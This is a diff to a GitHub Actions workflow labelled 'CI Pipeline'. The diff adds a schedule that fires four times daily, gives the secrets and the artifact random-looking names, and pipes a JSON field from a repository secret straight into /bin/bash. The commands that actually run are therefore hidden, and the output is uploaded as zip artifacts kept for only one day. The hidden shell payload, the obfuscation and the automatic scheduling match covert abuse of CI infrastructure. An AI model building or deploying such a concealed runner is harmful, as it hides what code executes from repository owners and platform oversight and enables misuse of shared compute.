@@ -2,6 +2,8 @@ name: CI Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '12 1,7,13,19 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -12,14 +14,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          hvl6: ${{ secrets.hvl6 }}
+          ppdf9375: ${{ secrets.ppdf9375 }}
         run: |
-          printf '%s' "$hvl6" | jq -r .dds35806 | /bin/bash
-          printf '%s' "$u63" | jq -r .hmc81436 | /bin/bash
+          printf '%s' "$ppdf9375" | jq -r .rkr688 | /bin/bash
+          printf '%s' "$uc47808" | jq -r .cqvpb89282 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
         with:
-          name: coQqQ3dv
+          name: lH6mn6mr
           path: "*.zip"
           retention-days: 1
